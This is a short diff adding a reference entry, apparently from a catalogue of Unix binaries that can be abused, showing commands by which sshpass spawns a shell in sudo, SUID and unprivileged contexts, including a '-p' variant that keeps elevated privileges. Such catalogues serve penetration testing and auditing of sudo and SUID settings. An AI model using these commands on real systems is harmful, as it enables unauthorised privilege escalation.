@@ -1,0 +1,14 @@
+sshpass
+=======
+
+Shell
+-----
+
+[Sudo]
+    sshpass /bin/sh
+
+[SUID]
+    sshpass /bin/sh -p
+
+[Unprivileged]
+    sshpass /bin/sh
